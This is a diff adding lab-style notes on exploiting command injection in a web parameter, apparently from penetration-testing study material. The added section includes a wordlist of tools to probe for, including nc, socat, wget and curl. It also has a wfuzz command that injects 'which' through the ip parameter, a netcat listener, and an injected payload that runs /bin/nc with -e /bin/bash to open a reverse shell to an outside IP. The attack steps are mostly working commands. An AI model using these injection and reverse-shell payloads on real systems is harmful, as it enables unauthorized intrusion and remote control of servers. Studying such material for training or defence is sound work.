@@ -193,6 +193,52 @@ time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"
 
 This time, the request took thirty seconds. Clearly, the sleep command ran. Very nice. We've discovered a blind command injection vector!
 
+```shell
+curl "http://target:80/flag.txt"
+```
+
+### Enumerating Command Injection Capabilities
+
+Let's create a wordlist /home/kali/capability_checks.txt and search for Linux-based utilities with wfuzz.
+
+We'll also add "w00tw00t" as a baseline for a non-existent file.
+
+```txt
+w00tw00t
+wget
+curl
+fetch
+gcc
+cc
+nc
+socat
+ping
+netstat  
+ss
+ifconfig
+ip
+hostname
+php
+python
+python3
+perl
+java
+```
+
+```shell
+wfuzz -c -z file,/home/kali/capability_checks.txt --hc 404 "http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which FUZZ"
+```
+
+### Obtaining a Shell - Netcat
+
+```shell
+nc -nlvp 9090
+```
+
+```shell
+http://target:80/nodejs/index.js?ip=127.0.0.1|/bin/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
+```
+
 
 
 # 🔄 Alternatives to `base64` Binary (Encode/Decode)
